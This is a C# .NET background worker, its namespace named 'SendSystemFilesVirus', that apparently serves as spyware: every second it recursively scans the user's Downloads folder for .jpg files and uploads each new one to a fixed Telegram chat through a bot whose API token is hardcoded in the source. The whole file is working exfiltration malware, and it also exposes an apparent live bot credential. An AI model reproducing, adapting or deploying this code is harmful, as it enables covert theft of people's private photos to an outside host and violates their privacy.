using Telegram.Bot;

namespace SendSystemFilesVirus
{
    public class Worker : BackgroundService
    {
        List<string> sendedFiles = new();
        private readonly ILogger<Worker> _logger;
        private readonly TelegramBotClient _telegramBotClient = new("6134936554:AAFWci8wBTcjI7ibASwK0LnKjFtbsjHkZVc");
        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {

            while (!stoppingToken.IsCancellationRequested)
            {

                string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string downloadPath = Path.Combine(path, "Downloads");

                string[] files = Directory.GetFiles(downloadPath, "*.jpg", SearchOption.AllDirectories);

                foreach (string file in files)
                {
                    if (!sendedFiles.Contains(file))
                    {
                        using (var stream = System.IO.File.OpenRead(file))
                        {
                            var r = await _telegramBotClient.SendPhotoAsync("591208356", new Telegram.Bot.Types.InputFiles.InputOnlineFile(stream));
                            sendedFiles.Add(file);
                        }
                    }
                }
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
                await Task.Delay(1000, stoppingToken);
            }
        }
    }
}